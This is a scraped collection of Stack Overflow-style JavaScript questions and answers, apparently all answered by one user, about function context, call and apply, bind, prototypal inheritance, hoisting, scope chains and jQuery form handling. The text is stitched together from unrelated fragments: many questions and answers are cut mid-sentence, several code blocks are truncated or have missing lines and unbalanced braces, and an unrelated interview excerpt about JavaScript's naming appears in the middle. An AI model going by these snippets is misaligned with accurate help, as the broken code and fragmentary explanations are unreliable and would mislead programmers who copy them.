<p>If I do 2 passes over the original array my resulting array would be:</p>

<pre><code>          [ 0,   0,   0,   0, 0, 
           25,  50,  75,  50, 25, 
           50, 150, 200, 150, 50, 
          75, 200, 300, 200, 75, 
           50, 150, 200, 150, 50, 
           25,  50,  75,  50, 25,
            0,   0,   0,   0, 0 ]
</code></pre>

<p>My current code is:</p>

<pre><code>this.distributeIntensities = function(passes, shareRatio) { 	
    for (var i = 0; i &lt; passes; i++) { this.distributeIntensity(shareRatio); }
}

this.distributeIntensity = function(shareRatio) {   	
    var tmp = hm.intensity.slice(0); // copy array
    for (var i = 0; i &lt; tmp.length; i++) {			
    	if (hm.intensity[i] &lt;= 0) { continue; }
    	var current = hm.intensity[i];
    	var shareAmount = current * shareRatio;						
    	this.shareIntensityWithNeighbours(tmp, shareAmount, i);												    			
    }		
    hm.intensity = tmp;
}

this.shareIntensityWithNeighbours = function(arr, heat, i) {    			    
    // This should be var x = Math.floor(...) however 
    // this is slower and without gives satisfactory results
    var x = i % hm.columnCount; 
    var y = i / hm.columnCount; 

    if (x &gt; 0) {
    	if (y &gt; 0) arr[i - hm.columnCount - 1] += heat;
    	arr[i - 1] += heat;
    	if (y &lt; (hm.rowCount - 1)) arr[i + hm.columnCount - 1] += heat;
    }				

    if (y &gt; 0) arr[i - hm.columnCount] += heat;		
    if (y &lt; (hm.rowCount - 1)) arr[i + hm.columnCount] += heat;

    if (x &lt; (hm.columnCount - 1)) {
    	if (y &gt; 0) arr[i - hm.columnCount + 1] += heat;
    	arr[i + 1] += heat;
    	if (y &lt; (hm.rowCount - 1)) arr[i + hm.columnCount + 1] += heat;
    }			    
}

<p>Now, this works however it is very slow (I am working with a huge array and 8 passes).  I know there is a faster/better/cleaner way of doing this but it is beyond my abilities so I put it out there in the hope that someone can point me in the right direction (Note: I do not speak fluent mathematics, in fact I'm pretty mathematically illiterate).</p>

","5445","","<p>Well, in your <code>for</code> loop on the <code>distributeIntensity</code> function I think you could make some small changes:</p>

<ul>
<li>Store the array <code>length</code>.</li>
<li>Invert the <code>if</code> statement to avoid the <code>continue</code> statement.</li>
</ul>

        }
    }
    hm.intensity = tmp;

<p>If the iteration order is not important for your algorithm, you could reverse-iterate your array, which is <a href=""http://solutoire.com/2008/07/29/javascripts-loop-benchmarks/"" rel=""nofollow"">known</a> to be faster:</p>

    while (i--) {
        if (hm.intensity[i] &gt; 0) {
          var current = hm.intensity[i];
          var shareAmount = current * shareRatio;
          this.shareIntensityWithNeighbours(tmp, shareAmount, i);
        }
    }
    hm.intensity = tmp;
};

<p>You might also want to consider integrating the <code>shareIntensityWithNeighbours</code> function within the loop, the function call could be somewhat expensive.</p>

"<p>What is apply invocation pattern in Javascript in reference to function invocation patterns and how can I use it?
What are the benefits of using this invocation pattern.</p>
","5445","","<p>The use of <code>apply</code> is related to the function context (the <code>this</code> keyword) and argument passing.</p>

<p>First, I think you should know in which cases the <code>this</code> keyword is <strong>implicitly</strong> set:</p>

<p>1- When a function is called as a method (the function is invoked as member of an object):</p>

<pre><code>obj.method(); // 'this' inside method will refer to obj
</code></pre>

<p>2- A normal function call:</p>

<pre><code>myFunction(); // 'this' inside the function will refer to the Global object
// or 
(function () {})();
</code></pre>

<p>3- When the <code>new</code> operator is used:</p>

<pre><code>var obj = new MyObj(); // this will refer to a newly created object.
</code></pre>

<p>Here is when <code>apply</code> and <code>call</code> come, those methods let you set <strong>explicitly</strong> the context when you invoke a function, eg.:</p>

<pre><code>function test(a) {
  alert(this + a);
}

test.call('Hello', ' world!');
</code></pre>

<p>In the above code, when the <code>test</code> function is called setting the <code>this</code> keyword to a String (<code>'Hello'</code>), and passing the <code>a</code> argument (<code>' world.'</code>).</p>

<p>Both, <code>call</code> and <code>apply</code> change the context of the executing function (the <code>this</code> keyword) inside the called function, but the <strong>difference</strong> between them is that with <code>apply</code>, you can send an Array or an Array-like object as the arguments of the function to be executed, which is extremely useful, for example:</p>

<pre><code>function sum() {
  var result = 0;
  for (var i = 0; i &lt; arguments.length; i++) {
    result += arguments[i];
  }
  return result;
}

var args = [1,2,3];
sum.apply(null, args); // will return 6
</code></pre>

<p>That can avoid some very hacky, <strong>bad</strong> (and common) <code>eval</code> calls like:</p>

<pre><code>eval('sum(' + args.join() +')');
</code></pre>

<p>Another example, the <code>Math.max</code> and <code>Math.min</code> methods, those methods can receive an arbitrary number of arguments like:</p>

<pre><code>var max = Math.max(2,4,6,8); // 8
</code></pre>

<p>But what if you have an Array of numbers?</p>

<pre><code>var numbers = [2,4,6,8];
numbers.push(10);
var max = Math.max.apply(null, numbers); // 10
</code></pre>

<p>Also note that when <code>null</code> or <code>undefined</code> is used as the <code>this</code> argument with <code>call</code> or <code>apply</code>, the <code>this</code> object will refer to the Global object (similar to the case #2, normal function invocation).</p>

<p>For the <code>Math.max</code> example, the context is not really relevant, since they are just like <em>""static""</em> methods, the <code>this</code> keyword is not used internally...</p>

  <p>These two pieces of code may appear to

  the setInterval will attempt to

"<p>A nasty gotcha in javascript is forgetting to call <code>new</code> on a function meant to be instantiated, leading to <code>this</code> being bound to a different object (usually the global) instead of a fresh one. One workaround I read about is to check for it explicitly in the function-constructor using the following idiom:</p>

<pre><code>function SomeConstructor(x, y, ...) {
    // check if `this` is created with new
    if ( !(this instanceof arguments.callee) )
        return new SomeConstructor(x, y, ...);
    // normal initialization code follows

<p>Now <code>new SomeConstructor(...)</code> and <code>SomeConstructor(...)</code> are equivalent.</p>

<p>I'd like to simplify this by creating a wrapper function <code>factory(fn)</code> that does the first two lines and then delegates to the wrapped function <code>fn</code>. This would be used like:</p>

    // normal initialization code follows

<p>This sort of works but it may call the wrapped function twice: once with no arguments (to create a new instance) and once with the passed arguments for the actual initialization. Apparently this is fragile and inefficient but I can't figure out a way to do it with a single call. Is this possible ?</p>

<p>EDIT: Based on bobince's approach, here's a similar one that does the trick:</p>

<pre><code>function factory(init) {
    var run_init = true;
    function constr() {
        if ( !(this instanceof constr) ) {
            run_init = false;
            var tmp = new constr();
            run_init = true;
            init.apply(tmp, arguments);
            return tmp;
        }
    if (run_init)
        init.apply(this, arguments);
  }
  return constr;
}
</code></pre>

<p>As for whether this is something that should be encouraged or not, that's debatable. I come from a Python background and I think of <code>new</code> as just noise (Java) or wart (Javascript), but I may be missing something.</p>
","5445","","<p>Your ""<code>factory</code>"" function could be written in this way:</p>

<pre><code>function factory(fn, /* arg1, arg2, ..., argn */) {
  var obj = new fn(), // Instantiate using 'new' to preserve the prototype chain
      args = Array.prototype.slice.call(arguments, 1); // remove fn argument
  fn.apply(obj, args); // apply the constructor again, with the right arguments
  return obj;
}

// Test usage:
function SomeConstructor (foo, bar) {
  this.foo = foo;
  this.bar = bar;
}
SomeConstructor.prototype.test = true;

var o = factory(SomeConstructor, 'foo', 'bar');
// will return: Object foo=foo bar=bar test=true, and
o instanceof SomeConstructor; // true
</code></pre>

<p>However, the <code>new</code> operator is not bad, I would not encourage you to avoid it, I would recommend you to stick with a proper naming convention, constructor functions identifiers in <em>PascalCase</em>, all other identifiers in <em>camelCase</em>, and also I highly recommend you to use <a href=""http://www.jslint.com/"" rel=""nofollow"">JsLint</a> it will help you to detect that kind of mistakes early.</p>

<p><a href=""http://bclary.com/2004/11/07/#a-13.2.2"">13.2.2</a> <code>[[Construct]]</code></p>

<p>When the <code>[[Construct]]</code> property for a <code>Function</code> object <code>F</code> is called, the following steps are taken:</p>

<ol>
<li>Create a new native ECMAScript object.</li>
<li>Set the <a href=""http://bclary.com/2004/11/07/#%5FClass%5F""><code>[[Class]]</code></a> property of <code>Result(1)</code> to <code>""Object""</code>.</li>

<li>If <code>Result(3)</code> is not an object, set the <a href=""http://bclary.com/2004/11/07/#%5FPrototype%5F""><code>[[Prototype]]</code></a> property of <code>Result(1)</code> to the original <code>Object</code> prototype object as described in <a href=""http://bclary.com/2004/11/07/#a-15.2.3.1"">15.2.3.1</a>.</li>
<li>Invoke the <a href=""http://bclary.com/2004/11/07/#a-13.2.1""><code>[[Call]]</code></a> property of <code>F</code>, providing <code>Result(1)</code> as the <code>this</code> value and providing the argument list passed into <code>[[Construct]]</code> as the argument values.</li>
<li>If <code>Type(Result(6))</code> is <code>Object</code> then return <code>Result(6)</code>.</li>
<li>Return <code>Result(1)</code>.</li>

"<p>Is there an easy way to populate one form field with duplicate content from another form field? </p>

<p>Maybe using jQuery or javascript?</p>
","5445","","<p>You just have to assign the field values:</p>

var first = document.getElementById('firstFieldId'),
    second = document.getElementById('secondFieldId');

second.value = first.value;

// Using jQuery
$('#secondFieldId').val($('#firstFieldId').val());

<p><strong>Eich:</strong> That’s right. It was all within six months from May till December (1995) that it was Mocha and then LiveScript. And then in early December, Netscape and <strong>Sun</strong> did a license agreement and it became JavaScript. And the idea was to make it a complementary scripting language to go with Java, with the compiled language.</p>
"
"<p>Since JavaScript is not derived from Java, why does it have ""Java"" in the name?</p>
","5445","","<p>JavaScript, was originally named Mocha, later it was renamed to LiveScript, and then to JavaScript.</p>

<p>The LiveScript to JavaScript name change came because Netscape and Sun did a license agreement.</p>

<p>The language was then submitted for standarization to the <a href=""http://www.ecma-international.org/"">ECMA International</a> Organization. By that time, Netscape didn't allow the use of the ""JavaScript"" name, so the standarized language is named <a href=""http://www.ecmascript.org/"">ECMAScript</a>.</p>

<p>JavaScript isn't actually an open name. Now it's a <a href=""http://www.sun.com/suntrademarks/#J"">trademark</a> of Sun (now Oracle).</p>

<p>There still a lot of confusion, some people still think that JavaScript, JScript, and ECMAScript are three different languages.</p>

<p>In the above example, the function expression is automatically executed, passing an argument.</p>

<p>That pattern is heavily used by jQuery plugins, since jQuery can run in <em>noConflict</em> mode, the <code>$</code> global variable will not be created, so the jQuery global object is passed as an argument of this <em>anonymous function</em> and inside of that function, you can freely refer to it as <code>$</code> (the received argument).</p>

"<p>I'm just getting into using prototypal JavaScript and I'm having trouble figuring out how to preserve a <code>this</code> reference to the main object from inside a prototype function when the scope changes. Let me illustrate what I mean (I'm using jQuery here):</p>

<pre><code>MyClass = function() {
  this.element = $('#element');
  this.myValue = 'something';

  // some more code
}

MyClass.prototype.myfunc = function() {
  // at this point, ""this"" refers to the instance of MyClass

  this.element.click(function() {
    // at this point, ""this"" refers to the DOM element
    // but what if I want to access the original ""this.myValue""?
  });
}

new MyClass();
</code></pre>

<p>I know that I can preserve a reference to the main object by doing this at the beginning of <code>myfunc</code>:</p>

<pre><code>var myThis = this;
</code></pre>

<p>and then using <code>myThis.myValue</code> to access the main object's property. But what happens when I have a whole bunch of prototype functions on <code>MyClass</code>? Do I have to save the reference to <code>this</code> at the beginning of each one? Seems like there should be a cleaner way. And what about a situation like this:</p>

<pre><code>MyClass = function() {
  this.elements $('.elements');
  this.myValue = 'something';

  this.elements.each(this.doSomething);
}

MyClass.prototype.doSomething = function() {
  // operate on the element
}

new MyClass();
</code></pre>

<p>In that case, I can't create a reference to the main object with <code>var myThis = this;</code> because even the original value of <code>this</code> within the context of <code>doSomething</code> is a <code>jQuery</code> object and not a <code>MyClass</code> object.</p>

<p>It's been suggested to me to use a global variable to hold the reference to the original <code>this</code>, but that seems like a really bad idea to me. I don't want to pollute the global namespace and that seems like it would prevent me from instantiating two different <code>MyClass</code> objects without them interfering with each other.</p>

<p>Any suggestions? Is there a clean way to do what I'm after? Or is my entire design pattern flawed?</p>
","5445","","<p>For preserving the context, the <code>bind</code> method is really useful, it's now part of the recently released <a href=""http://www.ecma-international.org/publications/standards/Ecma-262.htm"">ECMAScript 5th Edition</a> Specification, the implementation of this function is simple (only 8 lines long):</p>

<pre><code>// The .bind method from Prototype.js 
if (!Function.prototype.bind) { // check if native implementation available
  Function.prototype.bind = function(){ 
    var fn = this, args = Array.prototype.slice.call(arguments),
        object = args.shift(); 
    return function(){ 
      return fn.apply(object, 
        args.concat(Array.prototype.slice.call(arguments))); 
    }; 
  };
}
</code></pre>

<p>And you could use it, in your example like this:</p>

<pre><code>MyClass.prototype.myfunc = function() {

  this.element.click((function() {
    // ...
  }).bind(this));
};
</code></pre>

<p>Another example:</p>

<pre><code>var obj = {
  test: 'obj test',
  fx: function() {
    alert(this.test + '\n' + Array.prototype.slice.call(arguments).join());
  }
};

var test = ""Global test"";
var fx1 = obj.fx;
var fx2 = obj.fx.bind(obj, 1, 2, 3);

fx1(1,2);
fx2(4, 5);
</code></pre>

<p>In this second example we can observe more about the behavior of <code>bind</code>.</p>

<p>It basically generates a new function, that will be the responsible of calling our function, preserving the function context (<code>this</code> value), that is defined as the first argument of <code>bind</code>.</p>

<p>The rest of the arguments are simply passed to our function.</p>

<p>Note in this example that the function <code>fx1</code>, is invoked without any <em>object context</em> (<code>obj.method()</code> ), just as a simple function call, in this type of invokation, the <code>this</code> keyword inside will refer to the Global object, it will alert ""global test"".</p>

<p>Now, the <code>fx2</code> is the new function that the <code>bind</code> method generated, it will call our function preserving the context and correctly passing the arguments, it will alert ""obj test 1, 2, 3, 4, 5"" because we invoked it adding the two additionally arguments, it already had <em>binded</em> the first three.</p>

So instead of /template/foo.css I have to put: <a href=""http://hostname/directory/template/foo.css"" rel=""nofollow"">http://hostname/directory/template/foo.css</a>. I can't set it statically beacause script can be placed in different servers and different locations. So it can be: <a href=""http://foo.com/bar/foo.css"" rel=""nofollow"">http://foo.com/bar/foo.css</a> or <a href=""http://foo.com/foo.css"" rel=""nofollow"">http://foo.com/foo.css</a>. </p>

<p>Thanks all</p>
","5445","","<p>The snippet will <em>try</em> to make a full page reload, if there are images on the page, otherwise it just make a <em>redirect</em> to the same page itself.</p>

<p>Using <code>location.reload(true);</code>, the <code>true</code> argument causes the page to always be reloaded from the server.</p>

<p>But that condition is always <code>true</code>, since <a href=""https://developer.mozilla.org/en/DOM/document.images"" rel=""nofollow""><code>document.images</code></a> is an HTMLCollection, and it will never evaluate to <code>false</code>, even if there are no images on the page, the only values that evaluate to <code>false</code> in a boolean expression are <code>null</code>, <code>undefined</code>, <code>0</code>, <code>NaN</code>, an empty string, and of course <code>false</code>.</p>

<p>If you want to make that condition work, you should check the <code>length</code> property of <code>document.images</code>, the <code>length</code> property is numeric and that means that it will evaluate to <code>false</code> only when its value is <code>0</code>:</p>

<pre><code>if (document.images.length) {
    setTimeout(function () {
        location.reload(true); // forces a reload from the server
    }, 1000*60*15);

    setTimeout(function () {
        location.href = location.href;
    }, 1000*60*15);  // just reloads the page
}
</code></pre>

<p>Notice also that I'm now using function expressions instead of strings as the first argument of <code>setTimeout</code>, if strings are used the code will be evaluated at runtime (equivalent to a <code>eval</code> call) and that is not  really considered as a good practice.</p>

"<p>I have been under the impression for that JavaScript was always asynchronous.  However, I have learned that there are situations where it is not (ie DOM manipulations).

","5445","","<p>JavaScript is single-threaded, and all the time you work on a normal synchronous code-flow execution.</p>

<p>Good examples of the asynchronous behavior that JavaScript can have are events (user interaction, Ajax request results, etc) and timers, basically actions that you don't know exactly when they might happen.</p>

<p>note that the line <code>return this.o();</code> it is wrong its just there to demonstrate what i would like to accomplish</p>
","5445","","<p>Your code has some issues:</p>

<p>First, when you run it, you will end up with three global variables, <code>max</code>, <code>_min</code> and <code>options</code>.</p>

<p>JavaScript is function-scoped, but you should use the <code>var</code> statement to declare variables, if you don't use it, and the identifier you make the assignment is not found in the scope-chain, they will become properties of the Globlal object (<code>window</code>).</p>

<p>Second, I think you want to invoke a function passed as a String argument, if is that, you I would recommend you to use an object to group your functions, and be able to get them, if you just define your functions as variables, they are not bound to an accessible object (<em>technically variables, arguments and function declaration identifiers are bound to the non accessible</em> <a href=""http://bclary.com/2004/11/07/#a-10.1.3"" rel=""nofollow""><em>Variable Object</em></a>), e.g.:</p>

<pre><code>(function ($) {

    var privateFunction = function (){

    var functions = {

    };


    functions[o](); // invoke the function
    // ...
    return this; // preserve the jQuery method ""chainability""
  };
})(jQuery);
</code></pre>

<p><strong>Edit:</strong> If you want to declare a ""private function"", (not invokable through your String argument), you can simply declare it as a variable in the <code>$.fn.myFoo</code> function.</p>

<p>It will be usable by all your ""public functions"" (all the members of the <code>functions</code> object) but you won't be able to execute it using your <code>o</code> argument.</p>

<p>What is the advantage and the disadvatages in both cases? In the second i know that that function can be called from outside the main function.
Is there also a difference when running it? (like time and performance)</p>
","5445","","<p>You have to be careful with the second example, the <code>this</code> keyword will refer to the Global object if you invoke the function without the <code>new</code> operator, and by looking at your return value, seems that you aren't trying to make a <a href=""https://developer.mozilla.org/En/Core_JavaScript_1.5_Guide/Creating_New_Objects/Using_a_Constructor_Function"">constructor function</a>.</p>

<p>I think you need to know how the <code>this</code> keyword (the function context) works:</p>

<p>The <code>this</code> keyword is <strong>implicitly</strong> set when:</p>

<p>1- When a function is called as a method (the function is invoked as member of an object):</p>

<pre><code>obj.method(); // 'this' inside method will refer to obj
</code></pre>

<p>2- A normal function call:</p>

<pre><code>myFunction(); // 'this' inside the function will refer to the Global object
// or 
(function () {})();
</code></pre>

<p>3- When the <code>new</code> operator is used:</p>

<pre><code>var obj = new MyObj(); // this will refer to a newly created object.
</code></pre>

<p>And you can also set the <code>this</code> keyword <strong>explicitly</strong>, with the <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/Function/call""><code>call</code></a> and <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/Function/apply""><code>apply</code></a> methods:</p>

<pre><code>function test () {
  alert(this);
}

test.call(""Hello world""); // alerts 'Hello world'
</code></pre>

<p>Now, the difference between the <code>b</code> function of your two examples, is basically that in the first snippet, <code>b</code> is a <em>function declaration</em>, in your second example <code>b</code> is a <em>function expression</em>.</p>

<p>Function declaration are subject to <a href=""http://stackoverflow.com/questions/1710424/referencing-a-javascript-value-before-it-is-declared-can-someone-explain-this/1710509#1710509"">hoisting</a>, and they are evaluated at parse time, on function expressions are defined at run-time.</p>

"<p>I am coding a lot of annual data in JavaScript, and I was considering adding it to arrays, using the year as the array index and putting the data into the array. However, Firebug seems to be indicating that JavaScript handles this by populating two thousand odd entries in the array with ""undefined."" With hundreds of such arrays kicking around in active memory, I'm worried the overhead of hundreds of thousands of useless array items could start to slow the program down. Will it?</p>
","5445","","<p>When you set the value of a numeric index higher than the current <code>length</code> of your array, the <code>length</code> property is affected.</p>

data[year] = ""some data"";

// or
var data = {
  2009: ""2009 data"",

<p>No, as I said before, only the <code>length</code> property is changed, (if necessary, only if the index added is larger than the current <code>length</code>), <code>length</code> is incremented to be one more than the numeric value of that index.</p>

<p>The previous indexes don't really exist in the <code>Array</code> object, you can test it:</p>

<pre><code>var array = [];
array[10] = undefined;

array.hasOwnProperty(10); // true
array.hasOwnProperty(9);  // false

"<p>I have a form with an <code>onsubmit</code> attribute. I need to bind a new submit event and I need this one to be executed before any existing submit functions.</p>

        $('form').submit(function() {
          alert(""Third"");

          alert(""Always First"");

</code></pre>

<p>If you execute the script, first you get ""Second"", then ""First"".</p>

<p>Is is possible to bind a new submit event and specify whether the function must be called before any existing event?</p>

<p>Constraints:</p>

<ul>
<li>Existing events must be preserved.</li>
<li>I can't remove existing events because the content of the <code>onsubmit</code> attribute contains a quite complex logic written by Rails</li>
<li>(ADDED): the event should always be executed before any existing onsubmit event and already binded events (perhaps binded by an other plugin)</li>
</ul>

<p>Any idea?</p>
","5445","","<p>The inline submit event fires first, you could get a reference to it, nullify the <code>onsubmit</code> attribute on the <code>form</code> element, and then bind your new submit event, this one will execute your <em>old</em> submit handler:</p>

<pre><code>  jQuery(function($) {
    var form = $('form'), oldSubmit = form[0].onsubmit;
    form[0].onsubmit = null;

    $('form').submit(function() {
      alert(""First"");
      oldSubmit.call(this); // preserve the context
    });
  });
</code></pre>

<p>Note that I use the <code>call</code> method to invoke your old submit handler, this is to preserve the <code>this</code> keyword inside that function, it will be the <code>form</code> element itself.</p>

<p>If your original <code>onsubmit</code> handler has some validation behavior, you can get its return value by <code>var ret = oldSubmit.call(this);</code></p>

"<p>Reading Crockfords <a href=""http://javascript.crockford.com/style1.html"">The Elements of JavaScript Style</a> I notice he prefers defining variables like this:</p>

<pre><code>var first='foo', second='bar', third='...';
</code></pre>

<p>What, if any benefit does that method provide over this:</p>

<pre><code>var first='foo';
var second='bar';
var third='...';
</code></pre>

<p>Obviously the latter requires more typing but aside from aesthetics I'm wondering if there is a performance benefit gained by defining with the former style.</p>
","5445","","<p>Aside of aesthetics, and download footprint, another reason could be that the <code>var</code> statement is subject to <em>hoisting</em>. This means that regardless of where a variable is placed within a function, it is moved to the top of the scope in which it is defined.</p>

<p>E.g:</p>

<pre><code>var outside_scope = ""outside scope"";
function f1() {
    alert(outside_scope) ;
    var outside_scope = ""inside scope"";
}
f1();
</code></pre>

<p>Gets interpreted into:</p>

<pre><code>var outside_scope = ""outside scope"";
function f1() {
    var outside_scope; // is undefined
    alert(outside_scope) ;
    outside_scope = ""inside scope"";
}
f1();
</code></pre>

<p>Because of that, and the function-scope only that JavaScript has, is why Crockford recommends to declare all the variables at the <a href=""http://www.jslint.com/lint.html#var"">top of the function</a> in a single <code>var</code> statement, to resemble what will really happen when the code is actually executed.</p>

"<p>I would like to have some sort of lazy initialied object properties in javascript and would thus want to somehow overload the property read and write access i.e.:</p>

<p>Rationale: I want to use Javascript (Rhino) as scripting engine in an application and the datastructures that need to be accessible by the scripts can be very large and complex.

"<p>I've been looking into doing inheritance in JavaScript the correct prototypal way, according to Douglas Crockford: <a href=""http://javascript.crockford.com/prototypal.html"" rel=""nofollow"">http://javascript.crockford.com/prototypal.html</a></p>

<p>He writes: ""So instead of creating classes, you make prototype objects, and then use the object function to make new instances""</p>

<p>I figured this was the way to do it:</p>

<pre><code>var objA = {
    func_a : function() {
        alert('A');
    }
};

var objB = Object.create(objA);
objB.func_a = function() {
   alert('B');
}
objB.func_b = function() {
};


var objA_instance1 = Object.create(objA);
var objA_instance2 = Object.create(objA);
var objB_instance1 = Object.create(objB);
var objB_instance2 = Object.create(objB);
etc...
</code></pre>

<p>But wouldn't this mean that there are now four instances of func_a (since it's isn't part of objA.prototype, it's just ""inside"" it), or am I not understanding this correctly?</p>

<p>Also, is there any way I can reach the overridden function of a function (for example call  objA.func_a inside objB.func_a)?</p>

<p>Thanks in advance.</p>
","5445","","<p>There is only one instance of <code>func_a</code>, and it is defined on <code>objA</code>, that is because the Crockford's <code>Object.create</code> method uses that object (<code>objA</code>) simply as the prototype of your new objects:</p>

<pre><code>console.log(objA_instance1.func_a == objA .func_a); // true
console.log(objA_instance2.func_a == objA .func_a); // true
</code></pre>

<p><code>func_a</code> on your objA_instances are reached by the prototype chain, that objects don't really own that property:</p>

<pre><code>console.log(objA_instance1.hasOwnProperty('func_a')); // false
console.log(objA_instance2.hasOwnProperty('func_a')); // false

<p>In HTML I have a set of checkboxes grouped together by a class. I want to get an array in jQuery containing all the checkboxes that are selected/checked for that class (so other checkboxes on the page are ignored). </p>

<pre><code>&lt;input type=""checkbox"" class=""group1"" value=""18"" checked=""checked"" /&gt;
&lt;input type=""checkbox"" class=""group1"" value=""20"" /&gt;

&lt;input type=""checkbox"" class=""group2"" value=""77"" checked=""checked"" /&gt;
&lt;input type=""checkbox"" class=""group1"" value=""11"" /&gt;

<p>Would return the values of the checked/selected <code>group1</code> checkboxes into an array like this:</p>

<pre><code>var values = [ 18, 55, 10 ];

","5445","","<p>You can use the <a href=""http://docs.jquery.com/Selectors/checkbox""><code>:checkbox</code></a> and <a href=""http://docs.jquery.com/Selectors/checked""><code>:checked</code></a> pseudo-selectors and the <code>.class</code> selector, with that you will make sure that you are getting the right elements, only checked checkboxes with the class you specify.</p>

<p>Then you can easily use the <a href=""http://docs.jquery.com/Traversing/map"">Traversing/map</a> method to get an array of values:</p>

","5445","","<p>For this type of string manipulation, as a starting point, you could take advantage of using a powerful feature of the <code>String.prototype.replace</code> function, using its callback function:</p>

replaceTokens(""move %mouseX%+1 %mouseY%+1"", {mouseX: 100, mouseY: 200});

replaceTokens(""%foo% %bar%!!!"", {foo: 'Hello', bar: 'World'});
// returns Hello World!!!
replaceTokens(""I'm %name%, and I %action% %place%"", {name: 'CMS',

<p>in tat function i used window.open method to open a new window again with the same jsp page login.jsp with disabling the toolbars......</p>

<p>now wat happening is when iam opening same page again in new window obviously tat body onload function will again get called and opens a new window in indefinite........</p>

","5445","","<p>Since it's the same page a quick workaround could be to check if the <em>current</em> window has been opened programmatically, before executing <code>window.open</code>, something like this:</p>

"<p>In PHP/Java one can do:</p>

<pre><code>class Sub extends Base
{
}
</code></pre>

<p>And automatically all public/protected methods, properties, fields, etc of the Super class become a part of the Sub class which can be overridden if necessary.</p>

<p>What's the equivalent for that in Javascript?</p>
","5445","","<p>In JavaScript you don't have <em>classes</em> but you can get inheritance and behavior reuse in many ways:</p>

<p><strong>Pseudo-classical inheritance (through prototyping):</strong></p>

<pre><code>function Super () {
  this.member1 = 'superMember1';
}
Super.prototype.member2 = 'superMember2';

function Sub() {
  this.member3 = 'subMember3';
  //...
}
Sub.prototype = new Super();
</code></pre>

<p>Should be used with the <code>new</code> operator:</p>

<pre><code>var subInstance = new Sub();
</code></pre>

<p><strong>Function application or ""constructor chaining"":</strong></p>

<pre><code>function Super () {
  this.member1 = 'superMember1';
  this.member2 = 'superMember2';
}


function Sub() {
  Super.apply(this, arguments);
  this.member3 = 'subMember3';
}
</code></pre>

<p>This approach should also be used with the <code>new</code> operator:</p>

<pre><code>var subInstance = new Sub();
</code></pre>

<p>The difference with the first example is that when we <code>apply</code> the <code>Super</code> constructor to the <code>this</code> object inside <code>Sub</code>, it adds the properties assigned to <code>this</code> on <code>Super</code>, directly on the new instance, e.g. <code>subInstance</code> contains the properties <code>member1</code> and <code>member2</code> directly (<code>subInstance.hasOwnProperty('member1') == true;</code>).</p>

<p>In the first example, those properties are reached through the <em>prototype chain</em>, they exist on an internal <code>[[Prototype]]</code> object.</p>

<p><strong>Parasitic inheritance or Power Constructors:</strong></p>

<pre><code>function createSuper() {
  var obj = {
    member1: 'superMember1',
    member2: 'superMember2'
  };

  return obj;
}

function createSub() {
  var obj = createSuper();
  obj.member3 = 'subMember3';
  return obj;
}
</code></pre>

<p>This approach is based basically on ""object augmenting"", you don't need to use the <code>new</code> operator, and as you can see, the <code>this</code> keyword is not involved.</p>

<pre><code>var subInstance = createSub();
</code></pre>

<p><strong>ECMAScript 5th Ed. <code>Object.create</code> method:</strong></p>

<pre><code>// Check if native implementation available
if (typeof Object.create !== 'function') {
  Object.create = function (o) {
    function F() {}  // empty constructor
    F.prototype = o; // set base object as prototype
    return new F();  // return empty object with right [[Prototype]]
  };
}

var superInstance = {
  member1: 'superMember1',
  member2: 'superMember2'
};

var subInstance = Object.create(superInstance);
subInstance.member3 = 'subMember3';
</code></pre>

<p>The above method is a prototypal inheritance technique proposed by <a href=""http://javascript.crockford.com/prototypal.html"">Crockford</a>.</p>

<p>Object instances inherit from other object instances, that's it.</p>

<p>This technique can be better than simple ""object augmentation"" because the inherited properties aren't copied over all the new object instances, since the <em>base</em> object is set as the <code>[[Prototype]]</code> of the <em>extended</em> object, in the above example <code>subInstance</code> contains physically only the <code>member3</code> property.</p>

  d: 16
 }
</code></pre>

<p><em>conf.a</em> and <em>conf.b</em> is OK and returns proper values. But <em>conf.d</em> doesn't return 16 rather it goes undefined. Is there any solution suck that prototype based generalization can also be applied on these type of Objects.</p>

<p>All objects have this internal <code>[[Prototype]]</code> property, and only the <a href=""http://bclary.com/2004/11/07/#a-11.2.2""><code>new</code></a> operator when you call it with a constructor function is allowed to set it (through the <a href=""http://bclary.com/2004/11/07/#a-13.2.2""><code>[[Construct]]</code></a> internal operation).</p>

<p>If you want to have prototypal inheritance with object instances (without using constructors), the Crockford's <a href=""http://javascript.crockford.com/prototypal.html""><code>Object.create</code></a> technique is what you want (that method is now part of the recently approved ECMAScript 5th Edition):</p>

<pre><code>// Check if native implementation available

    function F() {}  // empty constructor
    F.prototype = o; // set base object as prototype

  };
}

var confProto = {
  d: 16
};
var conf = Object.create(confProto);
conf.a = 2;
conf.b = 4;

","5445","","<p>This can be an interest question if you want to know how the <a href=""http://bclary.com/2004/11/07/#a-10.1.4"" rel=""nofollow"">Scope Chain and the Identifier Resolution</a> process works.</p>

<p>The scope chain is a list of objects that are searched when evaluating an identifier, those objects are not accessible by code, only its properties (identifiers) can be accessed.</p>

<p>At first, in global code, the scope chain is created and initialised to contain only the global object.</p>

<p>The subsequent objects in the chain are created when you enter in function execution context and by the <code>with</code> statement and <code>catch</code> clause, both also introduce objects into the chain.</p>

<p>For example:</p>

<pre><code>// global code
var var1 = 1, var2 = 2;
(function () { // one
  var var3 = 3;
  (function () { // two
    var var4 = 4;

    with ({var5: 5}) { // three
      alert(var1);
    }
  })();
})();
</code></pre>

<p>In the above code, the scope chain will contain different objects in different levels, for example, at the lowest level, within the <code>with</code> statement, if you use the <code>var1</code> or <code>var2</code> variables, the scope chain will contain 4 objects that will be needed to inspect in order to get that identifier: the one introduced by the <code>with</code> statement, the two functions, and finally the global object.</p>

<p>You also need to know that <code>window</code> is <em>just a property</em> that exists in the global object and it <em>points to the global object itself</em>. <code>window</code> is introduced by browsers, and in other environments often it isn't available.</p>

<p>In conclusion, when you use <code>window</code>, since it is just an identifier (is not a reserved word or anything like that) and it needs to pass all the resolution process in order to get the global object, <code>window.Math</code> needs an additional step that is made by the dot (<code>.</code>) property accessor.</p>

"<p>I am wondering how to simulate Class Inheritance in JavaScript. I know class doesn't apply to JavaScript, the way we use is Functions to create objects and do the inheritance things through Prototype object.</p>

<p>Hope it helps others as well.</p>
","5445","","<p>There are plenty ways of implementing inheritance and behavior reuse in JavaScript, perhaps the way that is more similar to your <em>class-based</em> OOP example would be the pseudo-classical inheritance:</p>

  this.lastname = lastname;
}

function Person (name, lastname) {
  this.name = name;
  this.lastname = lastname;

  this.run = function() {

  };
}
Person.prototype = new Mankind();
